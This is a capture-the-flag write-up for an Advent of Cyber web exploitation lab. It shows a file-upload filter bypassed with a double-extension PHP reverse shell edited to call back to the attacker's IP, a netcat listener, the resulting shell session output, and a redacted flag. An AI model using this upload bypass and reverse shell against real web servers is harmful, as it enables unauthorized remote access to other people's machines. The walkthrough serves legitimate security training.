# [Day 2] Web Exploitation The Elf Strikes Back!
After starting the machine we browse to the assigned ip.
Here we're greeted with a screen saying:
```
You are not signed in
Please enter your ID as a GET parameter (?id=YOUR_ID_HERE)
```
In the task assignment we were given an id `ODIzODI5MTNiYmYw`.
We add the id parameter to the URL by appending `?id=<our assigned id>` to the path. 
This solves task one.

We are then greeted by an uploads page. 
Checking the page source revealt that the input field has an `accept` attribute.
This reveals which file types we're allowed to upload. The accepted types are `.jpeg,.jpg,.png`.
These are all ____ files and we have solved task two.

If using kali we have some reverse shells located in `/usr/share/webshells/php/php-reverse-shell.php`.
If not using kali, we can find a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) by googling it.
To bypass the upload filter we can simply have the shell include on of the allowed extentions.
```
cp php-reverse-shell.jpg.php
```
After changing the name and editing the script to use our own ip, we upload it to the server.

Now we want to find the directory where the file was uploaded. By checking some common upload paths, 
we find that the directory is called `/u*****s/`. This solves task three.

Here se see our reverse shell we uploaded earlier.
We start a netcat listner by running:
```
nc -lnvp 1234
```
Clicking the shell file in the browser makes the server execute our php script.
Our netcat session responds with:
```
kali@kali:~$ nc -lnvp 1234                                                                                        
listening on [any] 1234 ...
connect to [10.9.129.26] from (UNKNOWN) [10.10.118.86] 35128
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:28:37 up 32 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (881): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$
```
Now we have access to the machine. This solves task four.

Reading the flag in `/var/www/flag.txt`:
```
sh-4.4$ cat /var/www/flag.txt
cat /var/www/flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{********************************}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================


sh-4.4$
```
